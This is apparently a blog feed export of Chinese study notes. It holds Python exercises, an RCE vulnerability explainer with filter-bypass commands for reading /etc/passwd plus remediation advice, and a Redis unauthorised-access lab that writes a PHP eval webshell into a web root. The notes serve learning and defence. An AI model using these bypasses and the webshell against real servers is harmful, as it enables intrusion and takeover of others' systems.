<p>解析：<br>输入时是字符串，因此需要用<code>int / lambda x:int(x)</code>转化为整型，用<code>x. split(&#39; &#39;)</code>将输入时间隔的空格去掉<br>采用切片操作[-6:-1],意思是从列表的倒数第6个开始，一直到倒数第1个<br>remove()函数从列表中移除括号内的数字，从左到右第一个会被移除<br>len()输出列表长度</p>
</li>
<li><p>已知函数定义 <code>def func(**p):return &#39;&#39;.join(sorted(p))</code>，那么表达式<code>func(x=1, y=2, z=3)</code>的值是:<br>‘xyz’<br>解析：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">**p</span>):</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="built_in">print</span>(func(x=<span class="number">1</span>, y=<span class="number">2</span>, z=<span class="number">3</span>))</span><br><span class="line"><span class="comment">#   &#123;&#x27;x&#x27;: 1, &#x27;y&#x27;: 2, &#x27;z&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">**p</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(p)</span><br><span class="line"><span class="built_in">print</span>(func(x=<span class="number">1</span>, y=<span class="number">2</span>, z=<span class="number">3</span>))</span><br><span class="line"><span class="comment">#   [&#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;]</span></span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">**p</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">sorted</span>(p))</span><br><span class="line"><span class="built_in">print</span>(func(x=<span class="number">1</span>, y=<span class="number">2</span>, z=<span class="number">3</span>))</span><br><span class="line"><span class="comment">#   &#x27;xyz&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>:</span><br><span class="line">    price = <span class="number">1000</span>                     </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, c</span>):</span><br><span class="line">        self.color = c                 </span><br><span class="line">car1 = Car(<span class="string">&quot;Red&quot;</span>)                      </span><br><span class="line">car2 = Car(<span class="string">&quot;Blue&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(car1.color)</span><br><span class="line"><span class="built_in">print</span>(Car.price)</span><br><span class="line">Car.price = <span class="number">1100</span>                     </span><br><span class="line">Car.name = <span class="string">&#x27;QQ&#x27;</span>                        </span><br><span class="line">car1.color = <span class="string">&quot;Yellow&quot;</span>                  </span><br><span class="line"><span class="built_in">print</span>(car2.name)</span><br><span class="line"><span class="built_in">print</span>(Car.price)</span><br><span class="line"><span class="built_in">print</span>(car1.color)</span><br></pre></td></tr></table></figure>
<p>阅读上面程序，按顺序写出该程序的运行结果:<br><u>Red</u> <u>1000</u> <u>QQ</u> <u>1100</u> <u>Yellow</u></p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Test</span>(<span class="params">*p</span>):</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">调用该函数Test(<span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>), 输出正确的是：</span><br><span class="line"><span class="comment"># (3,5,8)</span></span><br></pre></td></tr></table></figure>
<p>解析：<br>有多个元素一次性输出，以元组形式输出</p>
</li>
<li><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Sum0</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([a, b, c])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Sum1</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>((a,b,c))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Sum2</span>(<span class="params">a, b=<span class="number">3</span>, c=<span class="number">5</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([a, b, c])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>(<span class="params">*p</span>):</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(Sum0(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(Sum1(c=<span class="number">8</span>,a=<span class="number">9</span>,b=<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(Sum2(a=<span class="number">8</span>, c=<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(Sum2(<span class="number">8</span>))</span><br><span class="line">demo(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>阅读上面的程序，按顺序写出该程序运行结果<br><u>6</u> <u>[9,10,8]</u> <u>13</u> <u>16</u> <u>(1,2)</u></p>
</li>
<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sorted([&#x27;bbc&#x27;,&#x27;abc&#x27;,&#x27;bcd&#x27;,&#x27;acd&#x27;], key=lambda x:(x[0],x[2]))</span><br></pre></td></tr></table></figure>
<p>值为：<br>[‘abc’,’acd’,’bbc’,’bcd’]<br>解析：<br>sorted按照字符大小排序</p>
</li>
</ol>
<h1 id="编程题"><a href="#编程题" class="headerlink" title="编程题"></a>编程题</h1><p>1.<br><strong>描述</strong><br>牛牛的Python老师为了更好地管理班级，利用一个类Student来管理学生，这个类包含了学生姓名（str）、学号（str）、分数（int）、每次作业等级（list[str]）等信息。请你帮助牛牛的老师实现这样一个类，并定义构造方法实现初始化，定义打印函数实现打印学生的姓名、学号、分数、提交作业的次数、每次作业的等级。<br><strong>输入描述：</strong><br>第一行输入字符串表示学生姓名。<br>第二行输入字符串表示学生学号。<br>第三行输入整数表示学生得分。<br>第四行输入多个大写字母表示每次作业等级，用空格间隔。<br><strong>输出描述：</strong><br>用一句话输出学生的姓名、学号、分数、提交作业的次数、每次作业的等级，可以参考输出样例。<br>示例1<br><strong>输入：</strong><br>NiuNiu<br>12345<br>90<br>A B C<br><strong>输出：</strong><br>NiuNiu’s student number is 12345, and his grade is 90. He submitted 3 assignments, each with a grade of A B C<br>题目来源：牛客网</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,stu_num,score,level</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.stu_num = stu_num</span><br><span class="line">        self.score = score</span><br><span class="line">        self.level = level</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">p</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;self.name&#125;</span>\&#x27;s student number is <span class="subst">&#123;self.stu_num&#125;</span>, and his grade is <span class="subst">&#123;self.score&#125;</span>. He submitted <span class="subst">&#123;<span class="built_in">len</span>(self.level)&#125;</span> assignments, each with a grade of <span class="subst">&#123;<span class="string">&quot; &quot;</span>.join(self.level)&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">name = <span class="built_in">input</span>()</span><br><span class="line">stu_num = <span class="built_in">input</span>()</span><br><span class="line">score = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">level = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">input</span>().strip().split(<span class="string">&#x27; &#x27;</span>)]</span><br><span class="line">Stu1 = Student(name,stu_num,score,level)</span><br><span class="line">Stu1.p()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2.<br><strong>描述</strong><br>请为牛客网的员工创建一个Employee类，包括属性有姓名（name）、（salary），并设置初始化。同时该类包括一个方法printclass，用于输出类似’NiuNiu‘s salary is 4000, and his age is 22’的语句。<br>请根据输入的name与salary为该类创建实例e，并调用printclass方法输出信息，如果没有年龄信息则输出错误信息”Error! No age”。<br>根据输入的年龄为实例e直接添加属性age等于输入值，再次调用printclass方法输出信息。（printclass方法中建议使用try…except…结构）<br><strong>输入描述：</strong><br>三行分别输入姓名name、工资salary、年龄age，其中第一个为字符串，后两个为整型数字。<br><strong>输出描述：</strong><br>根据描述输出错误信息或是打印信息。<br>示例1<br><strong>输入：</strong><br>NiuNiu<br>8000<br>22<br><strong>输出：</strong><br>Error! No age<br>NiuNiu’s salary is 8000, and his age is 22<br>题目来源：牛客网</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Employee</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, salary</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.salary = salary</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">printclass</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span>&#x27;s salary is <span class="subst">&#123;self.salary&#125;</span>, and his age is <span class="subst">&#123;self.age&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="built_in">input</span>()</span><br><span class="line">salary = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">e = Employee(name,salary)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    e.printclass()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error! No age&quot;</span>)</span><br><span class="line">    e.age = age</span><br><span class="line">    e.printclass()</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>描述</strong><br>请为牛客网的员工创建一个Employee类，包括属性有姓名（name）、（salary），并设置初始化。同时该类包括一个方法printclass，用于输出类似’NiuNiu‘s salary is 4000, and his age is 22’的语句。<br>请根据输入的信息为Employee类创建一个实例e，调用hasattr方法检验实例有没有属性age，如果存在属性age直接调用printclass输出，否则使用setattr函数为其添加属性age，并设置值为输入后，再调用printclass输出。<br><strong>输入描述：</strong><br>三行分别依次输入姓名name、工资salary、年龄age，其中第一行为字符串，后两行为整型数字。<br><strong>输出描述：</strong><br>第一行输出e有没有属性age，True或者False；<br>第二行输出printclass打印信息。<br>示例1<br><strong>输入：</strong><br>NiuNiu<br>4000<br>23<br><strong>输出：</strong><br>False<br>NiuNiu’s salary is 4000, and his age is 23<br>题目来源：牛客网</li>
</ol>
<p><strong>示例代码：</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Employee</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, salary</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.salary = salary</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">printclass</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span>&#x27;s salary is <span class="subst">&#123;self.salary&#125;</span>, and his age is <span class="subst">&#123;self.age&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error! No age&quot;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="built_in">input</span>()</span><br><span class="line">salary = <span class="built_in">input</span>()</span><br><span class="line">age = <span class="built_in">input</span>()</span><br><span class="line">e = Employee(name, salary)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">print</span>(<span class="built_in">hasattr</span>(e, <span class="string">&#x27;age&#x27;</span>)):</span><br><span class="line">    e.printclass()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">setattr</span>(e,<span class="string">&quot;age&quot;</span>,age)</span><br><span class="line">    e.printclass()</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>面向对象编程参考习题：<br><a href="https://www.cnblogs.com/plf-Jack/p/11054248.html#:~:text=python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E4%B9%8B%E7%BB%83%E4%B9%A0%E9%A2%981%201%20%E5%AE%9A%E4%B9%89%E7%AE%A1%E7%90%86%E5%91%98%E7%B1%BB%EF%BC%8C%E7%AE%A1%E7%90%86%E5%91%98%E6%9C%89%E5%B1%9E%E6%80%A7%20%28name%2Cpassword%29%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%88%9B%E5%BB%BA%E5%AD%A6%E6%A0%A1%E3%80%81%E5%88%9B%E5%BB%BA%E8%AF%BE%E7%A8%8B%E3%80%81%E5%88%9B%E5%BB%BA%E8%80%81%E5%B8%88%202%20%E5%AE%9A%E4%B9%89%E8%80%81%E5%B8%88%E7%B1%BB%EF%BC%8C%E8%80%81%E5%B8%88%E6%9C%89%E5%B1%9E%E6%80%A7%20%28name%2Cpassword%29%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%B7%BB%E5%8A%A0%E8%AF%BE%E7%A8%8B%E3%80%81%E7%BB%99%E5%AD%A6%E7%94%9F%E6%89%93%E5%88%86%2C%E4%BD%86%E5%8F%91%E7%8E%B0%E5%AD%A6%E7%94%9F%E6%B2%A1%E6%9C%89%E8%B4%AD%E4%B9%B0%E8%AF%BE%E7%A8%8B%E6%97%B6%EF%BC%8C%E4%B8%8D%E8%83%BD%E6%89%93%E5%88%86%EF%BC%8C%E5%B9%B6%E7%BB%99%E5%87%BA%E6%8F%90%E7%A4%BA%203,%28name%2Cpassword%29%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E5%AD%A6%E6%A0%A1%E3%80%81%E9%80%89%E6%8B%A9%E5%AD%A6%E6%A0%A1%E3%80%81%E9%80%89%E6%8B%A9%E8%AF%BE%E7%A8%8B%EF%BC%8C%E4%BD%86%E5%AD%A6%E6%A0%A1%E6%B2%A1%E6%9C%89%E8%AF%A5%E8%AF%BE%E7%A8%8B%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E6%8F%90%E7%A4%BA%EF%BC%8C%E5%B9%B6%E4%B8%94%E4%B8%8D%E8%83%BD%E9%80%89%E6%8B%A9%E8%AF%A5%E8%AF%BE%E7%A8%8B%204%20%E5%AE%9A%E4%B9%89%E5%AD%A6%E6%A0%A1%E7%B1%BB%EF%BC%8C%E5%AD%A6%E6%A0%A1%E6%9C%89%E5%B1%9E%E6%80%A7%20%28name%2Caddr%29%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%B7%BB%E5%8A%A0%E8%AF%BE%E7%A8%8B%205%20%E5%AE%9A%E4%B9%89%E8%AF%BE%E7%A8%8B%E7%B1%BB%EF%BC%8C%E8%AF%BE%E7%A8%8B%E6%9C%89%E5%B1%9E%E6%80%A7%20%28name%29%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%B7%BB%E5%8A%A0%E5%AD%A6%E7%94%9F%20">python面向对象之练习题1</a><br><a href="https://blog.csdn.net/qq_44034384/article/details/107600403">Python面向对象练习题汇总</a></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>就写到这里了，虽然不算写得很好，但还是有模有样吧<br>希望Python期末能考高分！</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE漏洞</title>
    <url>/2022/12/10/RCE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于来到RCE了，感觉在漏洞中会很常见。</p>
<span id="more"></span>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>RCE（remote command&#x2F;code execute），远程命令&#x2F;代码执行。RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE分为远程命令执行ping和远程代码执行evel。</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作接口。比如常见的路由器，防火墙，入侵检测等设备的web管理界面上。一般会给用户提供ping操作的web界面。<br>用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交不符合预期的命令，并让后台执行，从而控制整个后台服务器。<br>现在很多企业开始实施自动化运维，大量系统操作会通过“自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行漏洞。远程代码执行 同样的道理，因为需求设计，后台有时也会把用户的输入作为代码的一部分执行，也就造成RCE漏洞。比如代码执行的函数，不安全的反序列化等等。<br>因此，如果需要给前端用户提供操作类的API接口，一定要对接口输入的内容进行严格判断，比如实施严格的白名单策略会是一个比较好的办法。</p>
<h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><h2 id="代码层过滤不严"><a href="#代码层过滤不严" class="headerlink" title="代码层过滤不严"></a>代码层过滤不严</h2><p>商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：</p>
<pre><code>system(&quot;/bin/program --arg $arg&quot;);
</code></pre>
<h2 id="系统漏洞造成命令注入"><a href="#系统漏洞造成命令注入" class="headerlink" title="系统漏洞造成命令注入"></a>系统漏洞造成命令注入</h2><pre><code>比如：bash破壳漏洞（CVE-2014-6217）
</code></pre>
<h2 id="调用的第三方组件存在代码执行漏洞"><a href="#调用的第三方组件存在代码执行漏洞" class="headerlink" title="调用的第三方组件存在代码执行漏洞"></a>调用的第三方组件存在代码执行漏洞</h2><pre><code>如wordpress中用来处理图片的imageMagick组件
Java中的命令执行漏洞（struts2/ElasticsearchGroovy等）
ThinkPHP5.x的命令执行
</code></pre>
<h1 id="命令执行漏洞的利用条件"><a href="#命令执行漏洞的利用条件" class="headerlink" title="命令执行漏洞的利用条件"></a>命令执行漏洞的利用条件</h1><ol>
<li>开发人员调用了能够执行系统命令的函数</li>
<li>这个函数的参数可控（即用户能够控制）</li>
<li>开发人员没有对该函数的参数进行过滤或过滤不严</li>
</ol>
<h1 id="可能存在命令执行漏洞的函数（PHP）"><a href="#可能存在命令执行漏洞的函数（PHP）" class="headerlink" title="可能存在命令执行漏洞的函数（PHP）"></a>可能存在命令执行漏洞的函数（PHP）</h1><h2 id="利用系统函数实现命令执行的函数"><a href="#利用系统函数实现命令执行的函数" class="headerlink" title="利用系统函数实现命令执行的函数"></a>利用系统函数实现命令执行的函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(), assert(), preg_replace(), call_user_func()</span><br></pre></td></tr></table></figure>
<p>如果页面存在以上函数且对用户输入没有作严格过滤，那么可能会造成远程命令执行漏洞，除此之外还有其它函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ob_start(), unserialize(), creat_function(), uasort(), uksort(), array_filter(), array_reduce()</span><br></pre></td></tr></table></figure>

<h2 id="直接执行系统命令的代码函数"><a href="#直接执行系统命令的代码函数" class="headerlink" title="直接执行系统命令的代码函数"></a>直接执行系统命令的代码函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(), exec(), shell_exec(), passthru(), pcntl_exec(), popen(), proc_open(), 反引号</span><br></pre></td></tr></table></figure>


<h1 id="命令拼接符号"><a href="#命令拼接符号" class="headerlink" title="命令拼接符号"></a>命令拼接符号</h1><p>命令拼接符号可以连接多个命令，恶意命令通常拼接在正常命令后面。</p>
<h2 id="Windows的系统命令拼接符"><a href="#Windows的系统命令拼接符" class="headerlink" title="Windows的系统命令拼接符"></a>Windows的系统命令拼接符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拼接符 		示例 		解释</span><br><span class="line">&amp; 		A&amp;B 		无论A是false还是true，B都执行。即互不影响</span><br><span class="line">&amp;&amp; 		A&amp;&amp;B 		具有短路效果，A是false，B就不执行</span><br><span class="line">| 		A|B 		表示A命令语句的输出，作为B命令语句的输入执行。当A为false的时候将不会执行</span><br><span class="line">|| 		A||B 		表示A命令语句执行失败，然后才执行B命令语句</span><br></pre></td></tr></table></figure>

<h2 id="Linux的系统命令拼接符"><a href="#Linux的系统命令拼接符" class="headerlink" title="Linux的系统命令拼接符"></a>Linux的系统命令拼接符</h2><h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>&amp;的作用是使命令在后台执行。只要在命令后面跟上一个空格和&amp;，可以一口气在后台运行多个命令。需要停止，就是kill -s 进程号。如下所示：<br><img src="/simg/rce_1.png" alt=" "></p>
<h3 id=""><a href="#" class="headerlink" title=";"></a>;</h3><p>分号（;）作用是进行多条命令的无关联执行，每一条执行结果互不影响，示例如下：<br><img src="/simg/rce_2.png" alt=" "></p>
<h3 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h3><p>&amp;&amp;的用法和功能与Windows相同，都是左边成功右边才能执行。</p>
<h3 id="-1"><a href="#-1" class="headerlink" title="||"></a>||</h3><p>||的用法和功能与Windows相同，都是前面执行失败才执行后面。</p>
<h3 id="-2"><a href="#-2" class="headerlink" title="()"></a>()</h3><p>如果想执行几条命令，则需要用命令分隔符分号隔开每条命令，并使用圆括号()把所有命令组合起来，示例如下：<br><img src="/simg/rce_3.png" alt=" "></p>
<h2 id="常用命令总述"><a href="#常用命令总述" class="headerlink" title="常用命令总述"></a>常用命令总述</h2><p>使用时不要局限于单个的，简单的用法，因为很多过滤参数的方式都是识别对应的拼接符，所以要思维变通，很多时候，大量拼接符层层嵌套往往会有出其不意的效果<br>    比如上面这个圆括号的使用例子，意思就是当echo 1 执行成功后会执行后面的命令，把echo 1输出到 11.txt ，然后复制11.txt到根目录。 结合||和&amp;&amp;可以实现复杂的功能。</p>
<h1 id="常用绕开防护的方法"><a href="#常用绕开防护的方法" class="headerlink" title="常用绕开防护的方法"></a>常用绕开防护的方法</h1><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><ul>
<li>常见通配符如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">符号 	含义</span><br><span class="line">? 		匹配单个字符，匹配多个字符需要多个?连用</span><br><span class="line">* 		*代表任意数量的字符</span><br><span class="line">[] 		代表一定有一个在括号内的字符（非任意字符），例如[abcd]代表一定有一个字符，可能是a,b,c,d这四个中任何一个</span><br></pre></td></tr></table></figure></li>
<li>使用示例：<br>一个常用的读取密码命令如下：<br><code>cat /etc/passwd</code><br>可以搭配多种通配符使用。<br>使用?通配符后，可能会有多种变化，比如：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /?tc/?as?wd</span><br><span class="line">cat /*tc/*as*wd</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a>连接符</h2><ul>
<li>常见连接符<br><code>单引号（&#39;）双引号（&quot;）反斜杠（\）  如：/&#39;b&#39;i&#39;n&#39;/&#39;c&#39;a&#39;t/&#39;e&#39;t&#39;c&#39;/&#39;p&#39;a&#39;s&#39;s&#39;w&#39;d</code></li>
<li>使用示例：<br><img src="/simg/rce_4.png" alt=" "></li>
</ul>
<h2 id="未初始化变量"><a href="#未初始化变量" class="headerlink" title="未初始化变量"></a>未初始化变量</h2><ul>
<li>简介<br>未初始化的变量值都是null，例如a,a,a,b，在Linux环境下都输出为null，所以可以用未初始化变量加在一些命令的末尾，来绕过一些黑名单。</li>
<li>使用示例<br><code>cat$a /etc$a/passwd$a</code><br><img src="/simg/rce_5.png" alt=" "></li>
</ul>
<h1 id="常见位置"><a href="#常见位置" class="headerlink" title="常见位置"></a>常见位置</h1><p>各种cms框架的命令执行漏洞是最多的，着重在这些地方找。除此之外就是插件位置，插件因为各种原因经常也需要执行系统命令。当然其它地方也有。</p>
<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><ol>
<li>各种框架、插件等都可能出现命令执行，升级到新版本，多打补丁</li>
<li>关注行业最新安全动态，一旦爆发命令执行漏洞，迅速修复，避免造成更大影响</li>
<li>少用框架&#x2F;cms</li>
<li>可以过滤一些符号从而减少一些危险</li>
<li>安全配置好php相关参数<br>php配置文件里有个disable_functions的配置，这个禁止某些php函数，服务器便是用这个来禁止php的执行命令函数。<br>例如：disable_functions&#x3D;system,passthru,shell_exec,exec,popen便禁止了用这些函数来执行系统命令</li>
<li>升级中间件</li>
<li>严格控制传入变量，严禁使用魔法函数</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>大多只是看了，没有实际操作，得加强一下实战方面。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_63844103/article/details/126953630?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126953630-blog-118893434.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126953630-blog-118893434.pc_relevant_default&utm_relevant_index=2">命令执行漏洞（RCE）详解</a><br><a href="https://blog.csdn.net/weixin_46706771/article/details/118893434">RCE(远程代码执行漏洞)原理及漏洞利用</a></p>
]]></content>
      <categories>
        <category>RCE</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis未授权访问</title>
    <url>/2023/03/19/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Redis 是一个开源（BSD许可）的，内存中的数据结构存储系统，它可以用作数据库、缓存和消息中间件。 它支持多种类型的数据结构，如 字符串（strings）， 散列（hashes）， 列表（lists）， 集合（sets）， 有序集合（sorted sets） 与范围查询， bitmaps， hyperloglogs 和 地理空间（geospatial） 索引半径查询。 Redis 内置了 复制（replication），LUA脚本（Lua scripting）， LRU驱动事件（LRU eviction），事务（transactions） 和不同级别的 磁盘持久化（persistence）， 并通过 Redis哨兵（Sentinel）和自动 分区（Cluster）提供高可用性（high availability）。</p>
<span id="more"></span>
<h1 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h1><p>测试系统：Centos7.9, 测试版本：Redis7.0.9</p>
<h2 id="打开Redis的配置文件：redis-conf查看配置情况"><a href="#打开Redis的配置文件：redis-conf查看配置情况" class="headerlink" title="打开Redis的配置文件：redis.conf查看配置情况"></a>打开Redis的配置文件：redis.conf查看配置情况</h2><p><code>vi redis.conf</code></p>
<ol>
<li><p>bind<br>默认配置为: <code>bind 127.0.0.1 -::1</code> ，意为仅允许本地连接。<br>测试过程中，要么注释该条语句，要么改为 <code>0.0.0.0</code></p>
</li>
<li><p>保护模式<br><code>protected-mode yes</code> 默认开启<br>测试过程中，选择关闭</p>
</li>
<li><p>默认密码<br>默认为: <code># requirepass foobared</code> ，能够连接任意客户端。<br>测试过程中，选择不设密码，或设弱密码</p>
</li>
</ol>
<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>客户端和服务端都需要具有Redis<br>攻击机（客户端）：192.168.112.14<br>靶机（服务端）：192.168.112.188</p>
<ul>
<li><p>客户端连接服务端正常情况<br>首先服务端需要打开服务。<br>客户端到Redis目录下执行命令（如果有密码）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli.exe -h 192.168.112.188 -a &lt;password&gt;</span><br><span class="line">set addr &lt;address&gt;</span><br><span class="line">或</span><br><span class="line">redis-cli.exe -h 192.168.112.188</span><br><span class="line">auth &lt;password&gt;</span><br><span class="line">set addr &lt;address&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>无密码直接登录，有密码尝试爆破<br>爆破方式：使用“超级弱口令检查工具”，勾选Redis爆破。</p>
</li>
</ul>
<h2 id="利用Redis写Webshell"><a href="#利用Redis写Webshell" class="headerlink" title="利用Redis写Webshell"></a>利用Redis写Webshell</h2><p>config set: 快捷修改redis设置<br>dbfilename: 设置快照的文件名，默认为dump.rdb<br>dir: 默认redis文件保存路径</p>
<p>首先要猜到网站的目录地址，然后可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a&#x2F;b的任意文件。<br>命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html/ </span><br><span class="line">config set  dbfilename shell.php </span><br><span class="line">set x &quot;\r\n\r\n&lt;?php eval($_POST[cmd]);?&gt;\r\n\r\n&quot; </span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<ul>
<li>\r\n\r\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行。</li>
<li>注意受害方redis是必须是以root的身份运行，不然会报错</li>
</ul>
<p>可以在对应文件夹找到相应文件，之后用蚁剑连接即可。</p>
